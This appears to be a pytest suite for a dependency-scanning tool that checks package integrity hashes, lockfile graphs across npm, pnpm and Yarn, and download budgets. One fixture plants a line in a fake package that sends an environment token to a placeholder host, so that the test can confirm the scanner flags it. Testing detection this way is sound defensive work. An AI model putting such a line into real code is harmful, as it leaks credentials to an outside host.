import base64
import hashlib
import io
import json
import tarfile
import time
import pytest
from backend.guardian.config import Budget
from backend.guardian.dependencies import RegistrySession, inspect_dependencies, lock_graph, BudgetExceeded
from backend.guardian.integrity import verify
from backend.guardian.engine import analyze
from backend.guardian import ingestion

def sri(data, algorithm='sha512'):
    return algorithm+'-'+base64.b64encode(hashlib.new(algorithm,data).digest()).decode()

def tarball(name='alpha', version='1.0.0', source='export const ok=1;'):
    out=io.BytesIO()
    with tarfile.open(fileobj=out,mode='w:gz') as tar:
        for name,content in [('package/package.json',json.dumps({'name':name,'version':version})),('package/index.js',source)]:
            raw=content.encode();entry=tarfile.TarInfo(name);entry.size=len(raw);tar.addfile(entry,io.BytesIO(raw))
    return out.getvalue()

def graph(entries=None):
    return {'package-lock.json':json.dumps({'name':'project','lockfileVersion':3,'packages':{'':{'dependencies':{'alpha':'1.0.0'}},**(entries or {'node_modules/alpha':{'version':'1.0.0'}})}})}

def registry(monkeypatch, data):
    urls=[]
    def download(url,limit=ingestion.MAX_UPLOAD,timeout=15):
        urls.append(url)
        if '/-/' in url:
            name=url.split('/')[3];raw=data[name]
            if len(raw)>limit:raise ValueError('download limit')
            return raw
        name=url.split('/')[3];raw=data[name]
        return json.dumps({'name':name,'version':'1.0.0','dist':{'tarball':f'https://registry.npmjs.org/{name}/-/{name}-1.0.0.tgz','integrity':sri(raw)}}).encode()
    monkeypatch.setattr(ingestion,'download',download)
    return urls

@pytest.mark.parametrize('algorithm',['sha512','sha1','sha256','sha384'])
def test_integrity_supported_algorithms(algorithm):
    result=verify(b'package',sri(b'package',algorithm))
    assert result.status=='verified' and result.computed==[result.expected]

@pytest.mark.parametrize('value,status',[(None,'missing'),('','missing'),('sha999-YWJj','unsupported'),('sha512-nope','invalid'),('not sri','invalid'),(12,'invalid'),('  ','invalid')])
def test_integrity_missing_invalid_unsupported(value,status):
    assert verify(b'package',value).status==status

def test_strongest_sri_cannot_fall_back_to_weak_match():
    assert verify(b'package',sri(b'wrong','sha512')+' '+sri(b'package','sha1')).status=='mismatch'

def test_integrity_mismatch_prevents_extraction(monkeypatch):
    raw=tarball();registry(monkeypatch,{'alpha':raw})
    monkeypatch.setattr(ingestion,'archive',lambda *a:pytest.fail('Unverified bytes must not be extracted'))
    result=RegistrySession().retrieve('alpha','1.0.0',sri(b'wrong'))
    assert result.integrity.status=='mismatch' and result.files=={}
    assert result.integrity.computed==[sri(raw)]

def test_missing_lock_integrity_distinct_from_registry_verified(monkeypatch):
    raw=tarball();registry(monkeypatch,{'alpha':raw})
    result=RegistrySession().retrieve('alpha','1.0.0')
    assert result.integrity.status=='missing'
    assert result.registry_integrity.status=='verified'
    assert result.files

def test_transitive_dependency_source_finding_and_dedup(monkeypatch):
    a=tarball();b=tarball('beta',source='fetch("https://example.invalid",{body:process.env.TOKEN});')
    urls=registry(monkeypatch,{'alpha':a,'beta':b})
    files=graph({'node_modules/alpha':{'version':'1.0.0','integrity':sri(a),'dependencies':{'beta':'1.0.0'}},'node_modules/beta':{'version':'1.0.0','integrity':sri(b)}})
    nodes,summary,findings,warnings,count=inspect_dependencies(files,analyze)
    assert summary.total==2 and summary.direct==1 and summary.transitive==1 and summary.inspected==2
    assert len(urls)==4
    assert any(f.rule=='SENSITIVE_TRANSMISSION' and f.package=='beta@1.0.0' for f in findings)
    assert nodes[1].integrity.status=='verified'
    assert all(e.file.startswith('dependencies/') for f in findings for e in f.evidence)

def test_cycle_terminates_and_downloads_once(monkeypatch):
    a=tarball();b=tarball('beta');urls=registry(monkeypatch,{'alpha':a,'beta':b})
    files=graph({'node_modules/alpha':{'version':'1.0.0','dependencies':{'beta':'1.0.0'}},'node_modules/beta':{'version':'1.0.0','dependencies':{'alpha':'1.0.0'}}})
    nodes,summary,_,warnings,_=inspect_dependencies(files,analyze)
    assert summary.inspected==2 and len(urls)==4
    assert any('cyclic' in w for w in warnings)

def test_nearest_nested_version_and_package_download_reuse(monkeypatch):
    a=tarball();b=tarball('beta');urls=registry(monkeypatch,{'alpha':a,'beta':b})
    files=graph({'node_modules/alpha':{'version':'1.0.0','dependencies':{'beta':'1.0.0','alpha':'1.0.0'}},'node_modules/alpha/node_modules/beta':{'version':'1.0.0'},'node_modules/alpha/node_modules/alpha':{'version':'1.0.0'}})
    nodes,summary,_,_,_=inspect_dependencies(files,analyze)
    assert summary.inspected==3 and len(urls)==4
    assert nodes[0].dependencies[0]=='node_modules/alpha/node_modules/beta'

def test_depth_limit_keeps_uninspected_explicit(monkeypatch):
    a=tarball();b=tarball('beta');registry(monkeypatch,{'alpha':a,'beta':b})
    files=graph({'node_modules/alpha':{'version':'1.0.0','dependencies':{'beta':'1.0.0'}},'node_modules/beta':{'version':'1.0.0'}})
    session=RegistrySession(Budget(depth=1))
    nodes,summary,_,warnings,_=inspect_dependencies(files,analyze,session=session)
    assert summary.inspected==1 and summary.skipped==1
    assert nodes[1].status=='skipped'
    assert any('incomplete' in w for w in warnings)

def test_package_budget_zero(monkeypatch):
    nodes,summary,_,_,_=inspect_dependencies(graph(),analyze,session=RegistrySession(Budget(packages=0)))
    assert summary.skipped==1 and summary.registry_requests==0

def test_unavailable_dependency_is_never_safe():
    nodes,summary,_,warnings,_=inspect_dependencies(graph(),analyze)
    assert nodes[0].status=='unavailable' and summary.unavailable==1

def test_integrity_failure_has_separate_domain(monkeypatch):
    a=tarball();registry(monkeypatch,{'alpha':a})
    nodes,summary,findings,_,_=inspect_dependencies(graph({'node_modules/alpha':{'version':'1.0.0','integrity':sri(b'wrong')}}),analyze)
    assert summary.inspected==0 and nodes[0].status=='integrity_failed'
    assert findings[0].domain=='integrity'

def test_request_and_download_budget(monkeypatch):
    raw=tarball();registry(monkeypatch,{'alpha':raw})
    with pytest.raises(BudgetExceeded):RegistrySession(Budget(requests=1)).retrieve('alpha','1.0.0')
    with pytest.raises((ValueError,BudgetExceeded)):RegistrySession(Budget(bytes=1)).retrieve('alpha','1.0.0')

def test_elapsed_budget(monkeypatch):
    session=RegistrySession(Budget(seconds=1));session.started-=2
    with pytest.raises(BudgetExceeded):session.retrieve('alpha','1.0.0')

def test_unresolved_and_workspace_entries():
    nodes,_,warnings=lock_graph(graph({'node_modules/alpha':{'link':True,'resolved':'../alpha'}}))
    assert nodes[0].status=='unresolved'
    nodes,_,warnings=lock_graph({'package.json':'{"dependencies":{"alpha":"^1.0.0"}}'})
    assert nodes[0].status=='unresolved' and warnings

def _assert_reconciliation(summary):
    assert (
        summary.inspected
        + summary.skipped
        + summary.unavailable
        + summary.unresolved
        + summary.integrity_failed
        + summary.not_attempted
    ) == summary.total
    assert (summary.direct + summary.transitive) == summary.total

def test_graph_just_below_discovery_cap(monkeypatch):
    monkeypatch.setattr('backend.guardian.dependencies.MAX_DISCOVERED', 20)
    entries = {f'node_modules/pkg_{i}': {'version': '1.0.0'} for i in range(19)}
    files = {'package-lock.json': json.dumps({'name': 'proj', 'lockfileVersion': 3, 'packages': {'': {'dependencies': {'pkg_0': '1.0.0'}}, **entries}})}
    nodes, summary, _, warnings, _ = inspect_dependencies(files, analyze)
    _assert_reconciliation(summary)
    assert summary.total == 19
    assert not any('inventory capped' in w for w in warnings)

def test_graph_exactly_at_discovery_cap(monkeypatch):
    monkeypatch.setattr('backend.guardian.dependencies.MAX_DISCOVERED', 20)
    entries = {f'node_modules/pkg_{i}': {'version': '1.0.0'} for i in range(20)}
    files = {'package-lock.json': json.dumps({'name': 'proj', 'lockfileVersion': 3, 'packages': {'': {'dependencies': {'pkg_0': '1.0.0'}}, **entries}})}
    nodes, summary, _, warnings, _ = inspect_dependencies(files, analyze)
    _assert_reconciliation(summary)
    assert summary.total == 20

def test_graph_above_discovery_cap(monkeypatch):
    monkeypatch.setattr('backend.guardian.dependencies.MAX_DISCOVERED', 20)
    entries = {f'node_modules/pkg_{i}': {'version': '1.0.0'} for i in range(35)}
    files = {'package-lock.json': json.dumps({'name': 'proj', 'lockfileVersion': 3, 'packages': {'': {'dependencies': {'pkg_0': '1.0.0'}}, **entries}})}
    nodes, summary, _, warnings, _ = inspect_dependencies(files, analyze)
    _assert_reconciliation(summary)
    assert summary.total == 35
    assert summary.skipped >= 15
    assert any('inventory capped' in w for w in warnings)
    omitted = [n for n in nodes if 'ceiling' in n.reason]
    assert len(omitted) == 15
    assert all(n.status == 'skipped' for n in omitted)

def test_multiple_root_dependency_declarations():
    entries = {f'node_modules/root_{i}': {'version': '1.0.0'} for i in range(5)}
    root_deps = {f'root_{i}': '1.0.0' for i in range(5)}
    files = {'package-lock.json': json.dumps({'name': 'proj', 'lockfileVersion': 3, 'packages': {'': {'dependencies': root_deps}, **entries}})}
    nodes, summary, _, _, _ = inspect_dependencies(files, analyze)
    _assert_reconciliation(summary)
    assert summary.direct == 5
    assert summary.transitive == 0
    assert summary.total == 5

def test_duplicate_package_references():
    entries = {
        'node_modules/alpha': {'version': '1.0.0', 'dependencies': {'shared': '1.0.0'}},
        'node_modules/beta': {'version': '1.0.0', 'dependencies': {'shared': '1.0.0'}},
        'node_modules/shared': {'version': '1.0.0'}
    }
    files = {'package-lock.json': json.dumps({'name': 'proj', 'lockfileVersion': 3, 'packages': {'': {'dependencies': {'alpha': '1.0.0', 'beta': '1.0.0'}}, **entries}})}
    nodes, summary, _, _, _ = inspect_dependencies(files, analyze)
    _assert_reconciliation(summary)
    assert summary.total == 3
    assert summary.direct == 2
    assert summary.transitive == 1

def test_cyclic_dependencies_reconciled():
    entries = {
        'node_modules/a': {'version': '1.0.0', 'dependencies': {'b': '1.0.0'}},
        'node_modules/b': {'version': '1.0.0', 'dependencies': {'c': '1.0.0'}},
        'node_modules/c': {'version': '1.0.0', 'dependencies': {'a': '1.0.0'}}
    }
    files = {'package-lock.json': json.dumps({'name': 'proj', 'lockfileVersion': 3, 'packages': {'': {'dependencies': {'a': '1.0.0'}}, **entries}})}
    nodes, summary, _, warnings, _ = inspect_dependencies(files, analyze)
    _assert_reconciliation(summary)
    assert summary.total == 3
    assert any('cyclic' in w for w in warnings)

def test_nested_node_modules_resolution_reconciled():
    entries = {
        'node_modules/a': {'version': '1.0.0', 'dependencies': {'b': '2.0.0'}},
        'node_modules/a/node_modules/b': {'version': '2.0.0'},
        'node_modules/b': {'version': '1.0.0'}
    }
    files = {'package-lock.json': json.dumps({'name': 'proj', 'lockfileVersion': 3, 'packages': {'': {'dependencies': {'a': '1.0.0', 'b': '1.0.0'}}, **entries}})}
    nodes, summary, _, _, _ = inspect_dependencies(files, analyze)
    _assert_reconciliation(summary)
    assert summary.total == 3
    assert summary.direct == 2
    assert summary.transitive == 1

def test_workspace_link_dependencies_reconciled():
    entries = {
        'node_modules/local-pkg': {'version': '1.0.0', 'link': True, 'resolved': '../local'},
        'node_modules/reg-pkg': {'version': '1.0.0'}
    }
    files = {'package-lock.json': json.dumps({'name': 'proj', 'lockfileVersion': 3, 'packages': {'': {'dependencies': {'local-pkg': '1.0.0', 'reg-pkg': '1.0.0'}}, **entries}})}
    nodes, summary, _, _, _ = inspect_dependencies(files, analyze)
    _assert_reconciliation(summary)
    assert summary.unresolved >= 1

def test_missing_lockfile_references_reconciled():
    entries = {
        'node_modules/alpha': {'version': '1.0.0', 'dependencies': {'missing-transitive': '1.0.0'}}
    }
    files = {'package-lock.json': json.dumps({'name': 'proj', 'lockfileVersion': 3, 'packages': {'': {'dependencies': {'alpha': '1.0.0', 'missing-root': '2.0.0'}}, **entries}})}
    nodes, summary, _, _, _ = inspect_dependencies(files, analyze)
    _assert_reconciliation(summary)
    assert summary.unresolved >= 2
    assert summary.total == 3

def test_budget_exhaustion_traversal_and_retrieval(monkeypatch):
    raw = tarball()
    registry(monkeypatch, {'alpha': raw, 'beta': raw, 'gamma': raw})
    entries = {
        'node_modules/alpha': {'version': '1.0.0', 'dependencies': {'beta': '1.0.0'}},
        'node_modules/beta': {'version': '1.0.0', 'dependencies': {'gamma': '1.0.0'}},
        'node_modules/gamma': {'version': '1.0.0'}
    }
    files = {'package-lock.json': json.dumps({'name': 'proj', 'lockfileVersion': 3, 'packages': {'': {'dependencies': {'alpha': '1.0.0'}}, **entries}})}
    session = RegistrySession(Budget(packages=1))
    nodes, summary, _, warnings, _ = inspect_dependencies(files, analyze, session=session)
    _assert_reconciliation(summary)
    assert summary.inspected == 1
    assert summary.skipped == 2
    assert any('incomplete' in w for w in warnings)


def test_pnpm_lock_graph_direct_and_transitive(monkeypatch):
    a = tarball('alpha')
    b = tarball('beta')
    urls = registry(monkeypatch, {'alpha': a, 'beta': b})
    pnpm_content = f'''lockfileVersion: '6.0'
dependencies:
  alpha:
    specifier: ^1.0.0
    version: 1.0.0
packages:
  /alpha@1.0.0:
    resolution: {{integrity: {sri(a)}}}
    dependencies:
      beta: 1.0.0
  /beta@1.0.0:
    resolution: {{integrity: {sri(b)}}}
'''
    files = {
        'package.json': json.dumps({'name': 'pnpm-proj', 'version': '1.0.0', 'dependencies': {'alpha': '^1.0.0'}}),
        'pnpm-lock.yaml': pnpm_content
    }
    nodes, summary, findings, warnings, count = inspect_dependencies(files, analyze)
    _assert_reconciliation(summary)
    assert summary.total == 2
    assert summary.direct == 1
    assert summary.transitive == 1
    assert summary.inspected == 2
    assert nodes[0].name == 'alpha' and nodes[0].direct is True
    assert nodes[1].name == 'beta' and nodes[1].direct is False
    assert nodes[0].integrity.status == 'verified'
    assert nodes[1].integrity.status == 'verified'


def test_pnpm_lock_graph_v9_snapshots(monkeypatch):
    a = tarball('alpha')
    b = tarball('beta')
    registry(monkeypatch, {'alpha': a, 'beta': b})
    pnpm_v9_content = f'''lockfileVersion: '9.0'
importers:
  .:
    dependencies:
      alpha:
        specifier: 1.0.0
        version: 1.0.0
packages:
  alpha@1.0.0:
    resolution: {{integrity: {sri(a)}}}
  beta@1.0.0:
    resolution: {{integrity: {sri(b)}}}
snapshots:
  alpha@1.0.0:
    dependencies:
      beta: 1.0.0
  beta@1.0.0: {{}}
'''
    files = {'pnpm-lock.yaml': pnpm_v9_content}
    nodes, summary, _, _, _ = inspect_dependencies(files, analyze)
    _assert_reconciliation(summary)
    assert summary.total == 2
    assert summary.direct == 1
    assert summary.transitive == 1
    assert summary.inspected == 2


def test_pnpm_lock_cyclic_dependencies(monkeypatch):
    a = tarball('alpha')
    b = tarball('beta')
    registry(monkeypatch, {'alpha': a, 'beta': b})
    cyclic_pnpm = f'''lockfileVersion: '6.0'
dependencies:
  alpha: 1.0.0
packages:
  /alpha@1.0.0:
    resolution: {{integrity: {sri(a)}}}
    dependencies:
      beta: 1.0.0
  /beta@1.0.0:
    resolution: {{integrity: {sri(b)}}}
    dependencies:
      alpha: 1.0.0
'''
    files = {'pnpm-lock.yaml': cyclic_pnpm}
    nodes, summary, _, warnings, _ = inspect_dependencies(files, analyze)
    _assert_reconciliation(summary)
    assert summary.inspected == 2
    assert any('cyclic' in w for w in warnings)


def test_yarn_berry_lock_graph_direct_and_transitive(monkeypatch):
    a = tarball('alpha')
    b = tarball('beta')
    registry(monkeypatch, {'alpha': a, 'beta': b})
    yarn_content = f'''__metadata:
  version: 6
  cacheKey: 8

"alpha@npm:^1.0.0, alpha@npm:1.0.0":
  version: 1.0.0
  resolution: "alpha@npm:1.0.0"
  checksum: "{sri(a)}"
  dependencies:
    beta: "npm:^1.0.0"

"beta@npm:^1.0.0":
  version: 1.0.0
  resolution: "beta@npm:1.0.0"
  checksum: "{sri(b)}"
'''
    files = {
        'package.json': json.dumps({'name': 'yarn-proj', 'version': '1.0.0', 'dependencies': {'alpha': '^1.0.0'}}),
        'yarn.lock': yarn_content
    }
    nodes, summary, findings, warnings, count = inspect_dependencies(files, analyze)
    _assert_reconciliation(summary)
    assert summary.total == 2
    assert summary.direct == 1
    assert summary.transitive == 1
    assert summary.inspected == 2
    assert nodes[0].name == 'alpha' and nodes[0].direct is True
    assert nodes[1].name == 'beta' and nodes[1].direct is False
    assert nodes[0].integrity.status == 'verified'
    assert nodes[1].integrity.status == 'verified'


def test_yarn_v1_lockfile_rejected_with_warning():
    yarn_v1 = '''# THIS IS AN AUTOGENERATED FILE. DO NOT EDIT.
# yarn lockfile v1
alpha@^1.0.0:
  version "1.0.0"
  resolved "https://registry.yarnpkg.com/alpha/-/alpha-1.0.0.tgz#abc"
'''
    files = {
        'package.json': json.dumps({'name': 'yarn-v1-proj', 'dependencies': {'alpha': '^1.0.0'}}),
        'yarn.lock': yarn_v1
    }
    nodes, summary, _, warnings, _ = inspect_dependencies(files, analyze)
    assert summary.inspected == 0
    assert any('Yarn v1 lockfile format is not supported' in w for w in warnings)
